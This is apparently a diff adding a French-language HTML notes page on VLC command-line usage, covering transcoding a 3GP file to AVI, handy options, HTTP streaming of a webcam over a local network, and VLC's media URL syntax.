+<pre><code>&quot;C:\Program Files\VideoLAN\VLC\vlc.exe&quot; VIDEO0030.3gp:sout=&quot;#transcode{vcodec=div3,vb=4000,fps=25,acodec=mp3,ab=192,channels=2,samplerate=48000,audio-sync,deinterlace,scale=1}:std{access=file,mux=avi,dst=&#39;output.avi&#39;}&quot; </code></pre>
+<h2 id="options-utiles"><a href="#TOC">Options utiles</a></h2>
+<pre><code>--audio, --no-audio Activer l&#39;audio (activé par défaut)
+--start-time &lt;second&gt; Démarre la vidéo à un temps donné
+--stop-time &lt;second&gt; Arrêtes la vidéo à un temps donné
+-I dummy N&#39;ouvre pas l&#39;interface graphique
+vlc://quit A mettre en fin de ligne pour fermer vlc</code></pre>
+<h2 id="net-casting-http"><a href="#TOC">Net casting http</a></h2>
+<pre><code>vlc -I dummy v4l2:///dev/video0 --no-audio --sout &#39;#transcode{vcodec=mp4v,acodec=mpga,vb=900,ab=128}:std{access=http,mux=ogg,dst=192.168.0.227:8080}&#39;
+
+vlc http://ip:port</code></pre>
+<h2 id="devices"><a href="#TOC">Devices</a></h2>
+<pre><code>Stream MRL syntax:
+  [[access][/demux]://]URL[#[title][:chapter][-[title][:chapter]]]
+  [:option=value ...]
+
+  Many of the global --options can also be used as MRL specific :options.
+  Multiple :option=value pairs can be specified.
+
+URL syntax:
+  file:///path/file              Plain media file
+  http://host[:port]/file        HTTP URL
+  ftp://host[:port]/file         FTP URL
+  mms://host[:port]/file         MMS URL
+  screen://                      Screen capture
+  dvd://[device]                 DVD device
+  vcd://[device]                 VCD device
+  cdda://[device]                Audio CD device
+  udp://[[&lt;source address&gt;]@[&lt;bind address&gt;][:&lt;bind port&gt;]]
+                                 UDP stream sent by a streaming server
+  vlc://pause:&lt;seconds&gt;          Pause the playlist for a certain time
+  vlc://quit                     Special item to quit VLC
+
+v4l2:///dev/video0
+cdrom://</code></pre>
+<div id="footer">
+  &copy; 2012 <a href="http://https://github.com/phil2600/tech-scribe/">Tech-Scribe</a>
+</div>
+
+</body>
+</html>
